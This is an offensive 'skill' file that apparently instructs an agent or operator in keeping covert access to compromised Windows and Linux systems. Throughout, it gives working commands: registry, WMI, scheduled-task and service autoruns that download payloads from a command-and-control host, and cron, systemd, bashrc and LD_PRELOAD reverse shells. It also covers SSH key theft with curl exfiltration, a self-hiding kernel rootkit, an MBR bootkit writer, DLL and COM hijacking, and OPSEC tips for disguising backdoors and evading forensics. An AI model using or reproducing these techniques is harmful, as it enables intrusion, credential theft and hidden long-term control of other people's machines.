---
name: advanced-persistence-techniques
description: Maintain persistent access on compromised systems (backdoors, rootkits, autoruns)
version: 1.0.0
author: harezadmm
tags: [persistence, backdoor, rootkit, post-exploitation, stealth]
---

# Advanced Persistence Techniques

## When to Use
Maintaining long-term access to compromised systems after initial exploitation. Survives reboots, updates, and basic forensics. Used in APT operations, red team engagements.

## Prerequisites
- Initial access to target system (user or admin)
- Understanding of OS boot process
- Knowledge of process creation and startup mechanisms
- Ability to compile or modify binaries

## Persistence Categories

### 1. Registry-Based (Windows)
Run keys, scheduled tasks, WMI events.

### 2. Service-Based (Windows/Linux)
Malicious Windows services, systemd units.

### 3. File System (Both)
Startup folders, cron jobs, profile scripts.

### 4. Boot Process (Both)
Bootloaders, kernel modules, UEFI implants.

### 5. Application Hijacking
DLL hijacking, shared library preloading.

### 6. Living-Off-The-Land
PowerShell profiles, SSH authorized_keys.

## Procedure

### Step 1: Windows Registry Persistence

**Run keys (most common):**
```cmd
:: Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\svchost.exe" /f

:: All users (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "C:\Windows\Temp\monitor.exe" /f

:: RunOnce (executes once then deletes itself - good for stealth)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.server/stage2.ps1')" /f
```

**Advanced registry locations:**
```powershell
# Startup folder
$startup = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item backdoor.exe "$startup\WindowsDefender.exe"

# Winlogon registry
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\backdoor.exe" /f

# Image File Execution Options (debugger hijack)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
# Now pressing Shift 5 times on login screen opens cmd

# AppInit_DLLs (DLL injection into all processes)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\System32\evil.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f

# Screensaver persistence
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Windows\Temp\backdoor.scr" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 300 /f
```

**WMI Event Subscription (fileless persistence):**
```powershell
# Create event filter (trigger)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemUpdate"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create consumer (action)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemUpdateConsumer"
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -C `"IEX(New-Object Net.WebClient).DownloadString('http://c2.server/beacon.ps1')`""
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# List WMI subscriptions (for detection)
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

### Step 2: Scheduled Tasks Persistence

**Windows scheduled tasks:**
```cmd
:: Create task that runs every hour
schtasks /create /tn "GoogleUpdateTask" /tr "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.server/payload.ps1')" /sc hourly /ru SYSTEM

:: Run at logon
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /rl highest

:: Run at startup
schtasks /create /tn "SystemHealthCheck" /tr "cmd.exe /c start /min powershell.exe -w hidden C:\ProgramData\update.ps1" /sc onstart /ru SYSTEM

:: Daily at specific time
schtasks /create /tn "SecurityUpdate" /tr "C:\Users\Public\svchost.exe" /sc daily /st 03:00 /ru SYSTEM

:: Delete task (cleanup)
schtasks /delete /tn "GoogleUpdateTask" /f
```

**PowerShell version (more control):**
```powershell
# Create scheduled task with advanced options
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -ExecutionPolicy Bypass -File C:\ProgramData\monitor.ps1"

$Trigger = New-ScheduledTaskTrigger -AtStartup

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachine" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings

# List tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | Select TaskName,State
```

### Step 3: Windows Services Persistence

**Create malicious service:**
```cmd
:: Create service pointing to backdoor
sc create "WindowsSecurityService" binPath= "C:\Windows\Temp\backdoor.exe" start= auto DisplayName= "Windows Security Service"

:: Start service
sc start "WindowsSecurityService"

:: Configure service to restart on failure
sc failure "WindowsSecurityService" reset= 86400 actions= restart/60000/restart/60000/restart/60000

:: Query service
sc query "WindowsSecurityService"

:: Delete service (cleanup)
sc delete "WindowsSecurityService"
```

**Service DLL hijacking:**
```cmd
:: Many services load DLLs from predictable paths
:: Example: Windows Audio service loads AUDIODG.DLL

:: Create malicious DLL
:: (msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > evil.dll)

:: Replace legitimate DLL
takeown /f C:\Windows\System32\audiodg.dll
icacls C:\Windows\System32\audiodg.dll /grant %username%:F
move C:\Windows\System32\audiodg.dll C:\Windows\System32\audiodg.dll.bak
copy evil.dll C:\Windows\System32\audiodg.dll

:: Restart service
sc stop AudioSrv
sc start AudioSrv
```

**PowerShell service creation:**
```powershell
# Create service with New-Service
New-Service -Name "GoogleUpdateService" `
    -BinaryPathName "C:\ProgramData\Google\Update\GoogleUpdate.exe" `
    -DisplayName "Google Update Service" `
    -Description "Keeps your Google software up to date" `
    -StartupType Automatic

# Start service
Start-Service -Name "GoogleUpdateService"
```

### Step 4: Linux Cron Job Persistence

**User crontab:**
```bash
# Add to current user's crontab
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -

# Every reboot
(crontab -l 2>/dev/null; echo "@reboot /tmp/.hidden/backdoor.sh") | crontab -

# Daily at 3 AM
(crontab -l 2>/dev/null; echo "0 3 * * * curl http://c2.server/beacon.sh | bash") | crontab -

# Stealth: Hide in system cron
echo "*/15 * * * * root /usr/local/bin/.system_update" >> /etc/crontab

# List cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

**Systemwide cron:**
```bash
# Create cron.d entry (requires root)
cat > /etc/cron.d/system_update << 'EOF'
*/5 * * * * root /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
EOF

chmod 644 /etc/cron.d/system_update

# Hourly cron
echo '#!/bin/bash\ncurl http://c2.server/check.sh | bash' > /etc/cron.hourly/update_check
chmod +x /etc/cron.hourly/update_check
```

### Step 5: Linux Systemd Service Persistence

**Create systemd service:**
```bash
# Create service file
cat > /etc/systemd/system/system-monitor.service << 'EOF'
[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/tmp
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable system-monitor.service
systemctl start system-monitor.service

# Check status
systemctl status system-monitor.service

# User-level service (no root needed)
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/user-monitor.service << 'EOF'
[Unit]
Description=User Monitor

[Service]
ExecStart=/home/user/.local/bin/monitor.sh
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable user-monitor.service
systemctl --user start user-monitor.service
```

### Step 6: SSH Persistence

**Authorized keys backdoor:**
```bash
# Add SSH key for persistence
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Add attacker's public key
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root SSH key (requires root)
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Enable root login via SSH
sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
systemctl restart sshd
```

**SSH key stealing:**
```bash
# Steal existing SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name id_ecdsa 2>/dev/null
find / -name id_ed25519 2>/dev/null

# Exfiltrate
curl -X POST http://c2.server/keys -d @/home/user/.ssh/id_rsa

# SSH config modification for persistence
cat >> ~/.ssh/config << 'EOF'
Host *
    ProxyCommand bash -c 'curl http://c2.server/beacon?user=%r@%h:%p; exec nc %h %p'
EOF
```

### Step 7: Profile Script Persistence

**Bash profile:**
```bash
# Add to .bashrc (executes every time bash starts)
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &' >> ~/.bashrc

# More stealth - only trigger occasionally
cat >> ~/.bashrc << 'EOF'
if [ $((RANDOM % 10)) -eq 0 ]; then
    nohup bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &>/dev/null &
fi
EOF

# Global profile (affects all users)
echo 'curl http://c2.server/beacon.sh | bash &' >> /etc/profile

# /etc/bash.bashrc (Debian/Ubuntu)
echo '[ $((RANDOM % 5)) -eq 0 ] && (curl http://c2.server/c.sh | bash &)' >> /etc/bash.bashrc
```

**LD_PRELOAD hijacking:**
```bash
# Create malicious shared library
cat > backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    
    // Fork to avoid blocking parent process
    if (fork() == 0) {
        // Reverse shell
        system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &");
        exit(0);
    }
}
EOF

gcc -fPIC -shared -o /tmp/.lib.so backdoor.c -nostartfiles

# Add to /etc/ld.so.preload (requires root, very persistent)
echo "/tmp/.lib.so" > /etc/ld.so.preload

# Or user-level via bashrc
echo 'export LD_PRELOAD=/tmp/.lib.so' >> ~/.bashrc
```

### Step 8: Kernel Module Persistence (Rootkit)

**Linux kernel module:**
```c
// rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Kernel backdoor");

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    
    // Hide from lsmod
    list_del_init(&__this_module.list);
    
    // Reverse shell logic here
    // Or hook syscalls for persistent access
    
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

**Compile and load:**
```bash
# Makefile
cat > Makefile << 'EOF'
obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

# Build
make

# Load module
insmod rootkit.ko

# Auto-load at boot
echo "rootkit" >> /etc/modules
cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/

# Update module dependencies
depmod -a

# Verify
lsmod | grep rootkit
```

### Step 9: UEFI/Bootkit Persistence (Advanced)

**Windows bootkit (MBR infection):**
```python
# WARNING: Extremely invasive, can brick system
import struct

# Read MBR
with open('\\\\.\\PhysicalDrive0', 'rb') as disk:
    mbr = disk.read(512)

# Backup original MBR
with open('mbr_backup.bin', 'wb') as backup:
    backup.write(mbr)

# Inject bootkit code
# (Bootkit shellcode that loads before OS)
bootkit = b'\xEB\x3C\x90...'  # Custom bootkit

# Write modified MBR
with open('\\\\.\\PhysicalDrive0', 'r+b') as disk:
    disk.write(bootkit)

# Bootkit will execute before Windows loads
# Can hide files, processes, network connections
```

### Step 10: Application Hijacking Persistence

**Windows DLL hijacking:**
```cmd
:: Find applications loading DLLs from current directory
:: Use Process Monitor (procmon) to identify NAME NOT FOUND DLLs

:: Example: Application loads version.dll
:: Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > version.dll

:: Place in application directory
copy version.dll "C:\Program Files\TargetApp\version.dll"

:: When application runs, malicious DLL loads
```

**COM Hijacking (Windows):**
```powershell
# Find COM objects to hijack
Get-ChildItem "HKCU:\Software\Classes\CLSID" -Recurse | Select Name

# Hijack COM object
$CLSID = "{00000000-0000-0000-0000-000000000000}"  # Target CLSID

New-Item -Path "HKCU:\Software\Classes\CLSID\$CLSID" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\$CLSID\InProcServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$CLSID\InProcServer32" -Name "(default)" -Value "C:\Users\Public\evil.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$CLSID\InProcServer32" -Name "ThreadingModel" -Value "Apartment"

# When application instantiates COM object, evil.dll loads
```

**Linux .so preloading:**
```bash
# Add to /etc/ld.so.preload (global)
echo "/tmp/.evil.so" > /etc/ld.so.preload

# Or per-application via wrapper
cat > /usr/local/bin/firefox << 'EOF'
#!/bin/bash
export LD_PRELOAD=/tmp/.evil.so
/usr/bin/firefox.real "$@"
EOF

mv /usr/bin/firefox /usr/bin/firefox.real
chmod +x /usr/local/bin/firefox
```

## Pitfalls

**Detection**: Modern EDR detects registry autoruns, suspicious services, kernel modules.

**Updates**: Windows/Linux updates may remove persistence mechanisms.

**Forensics**: Experienced investigators check all persistence locations.

**Stability**: Buggy persistence can crash systems or fail silently.

**Overwrite**: Multiple persistence methods can interfere with each other.

## Verification

```powershell
# Windows - Check if persistence exists
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ScheduledTask | Where {$_.TaskName -eq "GoogleUpdateTask"}
Get-Service | Where {$_.Name -eq "WindowsSecurityService"}
Get-WmiObject -Namespace root\subscription -Class __EventFilter

# Test after reboot
shutdown /r /t 0
# Verify backdoor reconnects after system restarts
```

```bash
# Linux - Verify persistence
crontab -l
systemctl list-units --type=service --all | grep monitor
cat /etc/ld.so.preload
lsmod | grep rootkit
cat ~/.ssh/authorized_keys

# Test after reboot
reboot
# Verify backdoor reconnects
```

## OPSEC

- Use legitimate-looking names: "GoogleUpdateTask", "WindowsDefender"
- Timestamp manipulation: `touch -r C:\Windows\System32\kernel32.dll evil.exe`
- Hide files: `attrib +h +s backdoor.exe` (Windows), `mv backdoor .backdoor` (Linux)
- Encrypt payloads to avoid signature detection
- Randomize callback intervals to avoid pattern detection
- Use multiple persistence methods for redundancy
- Clean up failed persistence attempts

## References

- MITRE ATT&CK - Persistence (TA0003)
- Atomic Red Team persistence tests
- Windows Internals (Sysinternals)
- Linux rootkit development guides
- COM Hijacking techniques (BOHOPS)
